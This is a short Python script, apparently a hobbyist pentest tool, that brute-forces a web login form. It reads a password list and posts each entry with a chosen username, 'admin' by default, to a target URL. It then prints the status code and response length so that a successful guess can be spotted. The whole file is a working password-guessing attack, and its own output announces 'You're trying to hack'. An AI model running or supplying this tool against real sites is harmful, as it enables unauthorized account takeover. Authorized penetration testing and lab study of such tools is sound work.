#!/bin/python3
"""
Author: Thomas B.
Purpose: Fuzz a login webpage
"""

import argparse
import os
import requests


# --------------------------------------------
def get_args():
    parser = argparse.ArgumentParser(description="Password fuzzing for a login URL")
    parser.add_argument('url', help='URL with a login page')
    parser.add_argument('-U', '--username', metavar='username', default='admin', help="Username to hack by fuzzing the password")
    parser.add_argument('-P', '--passfile', metavar='passfile', default='passfile.txt', help='File with the password list, one by line')
    parser.add_argument('-lf', '--logfield', metavar='logfield', default='log', help='Login field on the webpage, e.g. "log_field"')
    parser.add_argument('-pf', '--pwdfield', metavar='pwdfield', default='pwd', help='Password field on the webpage, e.g. "pwd_field"')
    return parser.parse_args()
    
# --------------------------------------------
def main():
    args = get_args()
    print('Hello, You\'re trying to hack: ' + args.url + 
          '\nuser: ' + args.username + ' - password list: ' + args.passfile + 
          '\nLogin field: ' + args.logfield + ' - password field: ' + args.pwdfield, end='\n--------------------\n')

    if os.path.isfile(args.passfile):
        fh = open(args.passfile, 'r')
        for line in fh:
            print('Password tested: \t', line, end='')
            r = requests.post(args.url, data={args.logfield: args.username, args.pwdfield: line})
            print('\tStatus code: \t', r.status_code, '\n\tContent length: \t\t', len(r.content), end='\n--------------------\n')

# --------------------------------------------
if __name__ == '__main__':
    main()


